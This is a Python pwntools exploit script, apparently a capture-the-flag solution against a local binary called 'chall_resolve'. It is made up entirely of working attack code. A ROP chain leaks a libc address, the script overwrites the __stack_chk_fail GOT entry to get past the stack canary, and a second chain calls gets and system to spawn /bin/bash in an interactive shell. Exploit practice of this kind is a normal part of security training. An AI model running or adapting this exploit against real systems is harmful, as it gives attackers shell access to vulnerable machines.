#!/usr/bin/env  python3

import pwn

addr_rop = {}
addr_rop['pop_pop_pop_pop_ret'] = 0x000000000040129c # pop r12 ; pop r13 ; pop r14 ; pop r15 ; ret
addr_rop['pop_rdi_ret'] = 0x00000000004012a3 # pop rdi ; ret
addr_rop['ret'] = 0x000000000040101a # ret

def exploit(host,port,bin):
    io = pwn.remote(host,port)
    pwn.context.arch = 'x86-64'
    
    elf = pwn.ELF(bin)
    addr_got = {}
    addr_got['__stack_chk_fail'] = elf.got['__stack_chk_fail']
    addr_got['__libc_start_main'] = elf.got['__libc_start_main']
    
    addr_plt = {}
    addr_plt['printf'] = elf.plt['printf']
    addr_plt['fgets'] = elf.plt['fgets']
    
    addr = {}
    addr['main'] = elf.symbols['main']
    addr['toWrite'] = 0x404040
    
    recv = io.recvrepeat(0.3)
    print(f'recv = {recv}')
    
    
    print('============================ 1st payload ============================')
    payload = pwn.flat(
        b'\x00' * 0x8,
        pwn.pack(addr_rop['ret']),
        
        pwn.pack(addr_rop['pop_rdi_ret']),
        pwn.pack(addr_got['__libc_start_main']),    #   pop rdi
        
        pwn.pack(addr_plt['printf']),               #   ret
        pwn.pack(addr_rop['ret']),
        
        pwn.pack(addr['main']),
        
        b'\x0a'
    )
    print(f'payload = {payload}')
    io.send(payload)
    
    recv = io.recvrepeat(0.3)
    print(f'recv = {recv}')
    
    print('============================ 2nd payload ============================')
    payload = pwn.flat(
        str(hex(addr_got['__stack_chk_fail'])).encode(),
        b'\x0a'
    )
    print(f'payload = {payload}')
    io.send(payload)
    
    recv = io.recvrepeat(0.3)
    print(f'recv = {recv}')
    
    print('============================ 3rd payload ============================')
    payload = pwn.flat(
        str(hex(addr_rop['pop_pop_pop_pop_ret'])).encode(),
        b'\x00'
    )
    print(f'payload = {payload}')
    io.send(payload)
    
    recv = io.recvrepeat(0.3)
    print(f'recv = {recv}')
    
    
    addr['__libc_start_main'] = pwn.unpack(recv[0:6],word_size='48')
    addr['libc-2.31.so'] = addr['__libc_start_main'] - 0x0000000000023f90
    addr['system'] = addr['libc-2.31.so'] + 0x0000000000052290
    addr_rop['pop_rdx_ret'] = addr['libc-2.31.so'] + 0x0000000000142c92 # pop rdx ; ret
    addr_rop['pop_rsi_ret'] = addr['libc-2.31.so'] + 0x000000000002601f # pop rsi ; ret
    addr['gets'] = addr['libc-2.31.so'] + 0x0000000000083970 #<_IO_gets@@GLIBC_2.2.5>
    
    print('============================ 4st payload ============================')
    payload = pwn.flat(
        b'\x00' * 0x7,
        pwn.pack(addr_rop['ret']),
        
        pwn.pack(addr_rop['pop_rdi_ret']),
        pwn.pack(addr['toWrite']),
        
        pwn.pack(addr['gets']),
        pwn.pack(addr_rop['ret']),
        
        pwn.pack(addr_rop['pop_rdi_ret']),
        pwn.pack(addr['toWrite']+1),
        
        pwn.pack(addr['system']),
        b'\x0a'
    )
    print(f'payload = {payload}')
    io.send(payload)
    
    recv = io.recvrepeat(0.3)
    print(f'recv = {recv}')
    
    print('============================ 5nd payload ============================')
    payload = pwn.flat(
        str(hex(addr_got['__stack_chk_fail'])).encode(),
        b'\x0a'
    )
    print(f'payload = {payload}')
    io.send(payload)
    
    recv = io.recvrepeat(0.3)
    print(f'recv = {recv}')
    
    print('============================ 6rd payload ============================')
    payload = pwn.flat(
        str(hex(addr_rop['pop_pop_pop_pop_ret'])).encode(),
        b'\x00'
    )
    print(f'payload = {payload}')
    io.send(payload)
    
    recv = io.recvrepeat(0.3)
    print(f'recv = {recv}')
    
    
    print('============================ Send /bin/bash =========================')
    payload = b'/bin/bash' + b'\n'
    print(f'payload = {payload}')
    io.send(payload)
    
    recv = io.recvrepeat(0.3)
    print(f'recv = {recv}')
    
    io.interactive()
    
    print('=============================Information=============================')
    print('.got __libc_start_main   = ',end='')
    print(hex(addr_got['__libc_start_main']))
    
    print('addr __libc_start_main   = ',end='')
    print(hex(addr['__libc_start_main']))

    print('addr libc-2.31.so        = ',end='')
    print(hex(addr['libc-2.31.so']))
    
    print('addr fgets               = ',end='')
    print(hex(addr_plt['fgets']))
    
    print('addr system              = ',end='')
    print(hex(addr['system']))

    io.close()

if __name__=='__main__':
    host = '127.0.0.1'
    port = 4000
    bin = './chall_resolve'
    exploit(host,port,bin)